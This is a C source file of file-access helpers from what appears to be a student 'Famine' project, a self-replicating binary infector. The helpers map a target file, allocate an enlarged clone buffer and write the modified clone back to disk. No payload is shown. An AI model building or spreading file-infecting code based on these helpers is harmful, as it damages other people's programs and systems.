/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   accessors.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/05 06:32:25 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/07 12:08:05 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "accessors.h"
#include "syscall.h"
#include "errors.h"

/*
** safe_accessor()
** returns a safe pointer
** returns NULL if requested memory is out of range
*/

#define MAX_EXT_SIZE	131072

__warn_unused_result
void			*safe_accessor(const size_t offset, const size_t size, \
				const struct safe_pointer info)
{
	if (offset + size > info.filesize || offset + size < offset)
		return (NULL);
	return (info.ptr + offset);
}

bool			free_accessor(struct safe_pointer *info)
{
#ifdef DEBUG
	char e[] = {'1','1','\0'};
#endif
	if (info->ptr)
	{
		if (famine_munmap(info->ptr, info->filesize))
			return errors(ERR_SYS, (e));
	}
	return true;
}

__warn_unused_result
bool			original_accessor(struct safe_pointer *accessor, const char *filename)
{
	void		*ptr;
	struct stat	buf;
	int		fd = famine_open(filename, O_RDONLY);
#ifdef DEBUG
	char		e1[] = {'1','2','\0'};
	char		e2[] = {'1','3','\0'};
	char		e3[] = {'1','4','\0'};
	char 		e4[] = {'1','5','\0'};
	char 		e5[] = {'1','6','\0'};
#endif
	if (fd < 0)
		{return errors(ERR_SYS, e1);}
	if (famine_fstat(fd, &buf) < 0)
		{famine_close(fd); return errors(ERR_SYS, e2);}
	if (buf.st_mode & S_IFDIR)
		{famine_close(fd); return errors(ERR_USAGE, e3);}
	if ((ptr = famine_mmap(0, buf.st_size, PROT_READ, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
		{famine_close(fd); return errors(ERR_SYS, e4);}
	if (famine_close(fd))
		{return errors(ERR_SYS, e5);}

	accessor->ptr      = ptr;
	accessor->filesize = buf.st_size;
	return true;
}

__warn_unused_result
bool			clone_accessor(struct safe_pointer *accessor, const size_t original_filesize)
{
#ifdef DEBUG
	char	e[] = {'1','7','\0'};
#endif
	accessor->filesize = original_filesize + MAX_EXT_SIZE;
	accessor->ptr = famine_mmap(0, accessor->filesize, \
		PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);

	if (accessor->ptr == MAP_FAILED)
		{return errors(ERR_SYS, e);}
	return true;
}

__warn_unused_result
bool			write_clone_file(const struct safe_pointer accessor, \
				const char *filename)
{
	int	fd = famine_open(filename, O_CREAT | O_WRONLY | O_TRUNC, S_IRWXU);
#ifdef DEBUG
	char	e1[] = {'1','8','\0'};
	char	e2[] = {'1','9','\0'};
#endif
	if (fd == -1)
		return errors(ERR_SYS, e1);

	if (famine_write(fd, accessor.ptr, accessor.filesize) == -1)
	{
		famine_close(fd);
		return errors(ERR_SYS, e2);
	}

	famine_close(fd);
	return true;
}
